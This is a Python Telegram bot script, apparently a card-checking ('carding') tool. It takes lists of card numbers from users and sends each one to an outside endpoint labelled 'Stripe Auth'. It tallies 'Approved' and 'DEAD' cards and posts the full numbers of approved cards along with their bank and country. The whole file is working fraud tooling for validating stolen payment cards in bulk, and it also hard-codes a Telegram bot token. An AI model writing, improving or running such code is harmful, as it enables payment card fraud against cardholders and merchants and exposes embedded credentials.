import aiohttp
import asyncio
import json
import time
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    MessageHandler,
    CommandHandler,
    filters
)

TELEGRAM_BOT_TOKEN = "8031306974:AAFUlWwpvWDSeFDM3pjvDDv0_vo2l95wk5U"
API_ENDPOINT = "http://147.93.53.240:8000/liladmin-str?cc="

# Railway terminal logs ke liye logging setup
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pass

async def msa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text("⚠️ Please send a .txt file along with the /msa command.")
        return

    status_msg = await update.message.reply_text("📂 Downloading and parsing file...")
    
    try:
        file = await context.bot.get_file(update.message.document.file_id)
        file_bytes = await file.download_as_bytearray()
        cards = [line.strip() for line in file_bytes.decode('utf-8', errors='ignore').splitlines() if line.strip()]
    except Exception as e:
        logger.error(f"File reading failed: {str(e)}")
        await status_msg.edit_text(f"⚠️ Failed to read file: {str(e)}")
        return

    total_cards = len(cards)
    start_time = time.time()
    
    approved_count = 0
    dead_count = 0
    error_count = 0

    user_name = f"@{update.effective_user.username}" if update.effective_user.username else (update.effective_user.first_name or "Unknown")
    logger.info(f"Starting mass check for {total_cards} cards requested by {user_name}")

    async with aiohttp.ClientSession() as session:
        for idx, card in enumerate(cards, start=1):
            elapsed = int(time.time() - start_time)
            hit_rate = (approved_count / idx * 100) if idx > 0 else 0.0
            
            live_text = (
                f"⚡  **Stripe Auth Mass · Live**\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"▸ progress · {idx}/{total_cards}\n"
                f"▸ elapsed  · {elapsed}s\n"
                f"▸ hit rate · {hit_rate:.1f}%\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"◎ Approved · {approved_count}\n"
                f"ⓧ DEAD     · {dead_count}\n"
                f"⊖ Error    · {error_count}"
            )
            
            keyboard = [
                [
                    InlineKeyboardButton(f"✓ Approved ({approved_count})", callback_data="none"),
                    InlineKeyboardButton(f"ⓧ Dead ({dead_count})", callback_data="none")
                ]
            ]
            try:
                await status_msg.edit_text(live_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
            except:
                pass

            target = f"{API_ENDPOINT}{card}"
            logger.info(f"Checking card {idx}/{total_cards} -> Hit API: {target}")

            try:
                async with session.get(target, timeout=20) as response:
                    res = await response.text()
                    logger.info(f"API Response for card {idx}: Status {response.status} -> {res[:100]}")
                    
                try:
                    data = json.loads(res)
                    resp_msg = data.get("response", res)
                    brand = data.get("brand", "")
                    bank = data.get("bank", "")
                    country = data.get("country", "")
                    scheme = data.get("scheme", "")
                except:
                    resp_msg = res
                    brand = "B2B PRODUCT 1"
                    bank = ""
                    country = "UNITED KINGDOM"
                    scheme = "MASTERCARD · CREDIT"

                is_approved = "approved" in resp_msg.lower() or "added" in resp_msg.lower() or "success" in resp_msg.lower()
                
                if is_approved:
                    approved_count += 1
                    logger.info(f"Card APPROVED: {card} | Response: {resp_msg}")
                    reply = (
                        f"◎  **Approved · Stripe Auth**\n"
                        f"━━━━━━━━━━━━━━━━━\n"
                        f"▸ num  · {card}\n"
                        f"▸ gate · Stripe Auth\n"
                        f"▸ resp · {resp_msg}\n"
                        f"▸ user · {user_name}\n"
                        f"━━━━━━━━━━━━━━━━━\n"
                        f"▸ sch  · {scheme}\n"
                        f"▸ info · {brand}\n"
                        f"▸ bank · {bank}\n"
                        f"▸ ctry · {country}"
                    )
                    await update.message.reply_text(reply, parse_mode="Markdown")
                else:
                    dead_count += 1
                    logger.info(f"Card DEAD: {card} | Response: {resp_msg}")

            except Exception as e:
                error_count += 1
                logger.error(f"Error checking card {card}: {str(e)}")

            await asyncio.sleep(0.5)

    elapsed_time = int(time.time() - start_time)
    minutes = elapsed_time // 60
    seconds = elapsed_time % 60
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
    hit_rate = (approved_count / total_cards * 100) if total_cards > 0 else 0.0

    logger.info(f"Mass check complete. Total: {total_cards}, Approved: {approved_count}, Dead: {dead_count}, Errors: {error_count}")

    final_summary = (
        f"⚡  **Stripe Auth Mass · Complete**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"▸ cards    · {total_cards}\n"
        f"▸ elapsed  · {elapsed_str}\n"
        f"▸ hit rate · {hit_rate:.1f}%\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"◎ Approved · {approved_count}\n"
        f"ⓧ DEAD     · {dead_count}\n"
        f"⊖ Error    · {error_count}"
    )

    final_keyboard = [
        [
            InlineKeyboardButton(f"✓ Approved ({approved_count})", callback_data="none"),
            InlineKeyboardButton(f"ⓧ Dead ({dead_count})", callback_data="none")
        ]
    ]
    await status_msg.edit_text(final_summary, reply_markup=InlineKeyboardMarkup(final_keyboard), parse_mode="Markdown")

async def handle_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    raw_text = update.message.text.strip()
    target = f"{API_ENDPOINT}{raw_text}"
    user_name = f"@{update.effective_user.username}" if update.effective_user.username else (update.effective_user.first_name or "Unknown")

    logger.info(f"Single check -> Hit API: {target}")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(target, timeout=25) as response:
                res = await response.text()
                logger.info(f"API Single Response: Status {response.status} -> {res[:100]}")
                
        try:
            data = json.loads(res)
            resp_msg = data.get("response", res)
            brand = data.get("brand", "")
            bank = data.get("bank", "")
            country = data.get("country", "")
            scheme = data.get("scheme", "")
        except:
            resp_msg = res
            brand = "B2B PRODUCT 1"
            bank = ""
            country = "UNITED KINGDOM"
            scheme = "MASTERCARD · CREDIT"

        is_approved = "approved" in resp_msg.lower() or "added" in resp_msg.lower() or "success" in resp_msg.lower()

        if is_approved:
            logger.info(f"Single Card APPROVED: {raw_text}")
            reply = (
                f"◎  **Approved · Stripe Auth**\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"▸ num  · {raw_text}\n"
                f"▸ gate · Stripe Auth\n"
                f"▸ resp · {resp_msg}\n"
                f"▸ user · {user_name}\n"
                f"━━━━━━━━━━━━━━━━━\n"
                f"▸ sch  · {scheme}\n"
                f"▸ info · {brand}\n"
                f"▸ bank · {bank}\n"
                f"▸ ctry · {country}"
            )
            await update.message.reply_text(reply, parse_mode="Markdown")
        else:
            logger.info(f"Single Card DEAD: {raw_text}")

    except Exception as e:
        logger.error(f"Error in single check: {str(e)}")

def main():
    logger.info("Starting Telegram Bot...")
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("msa", msa_command))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_request))
    app.run_polling()

if __name__ == "__main__":
    main()
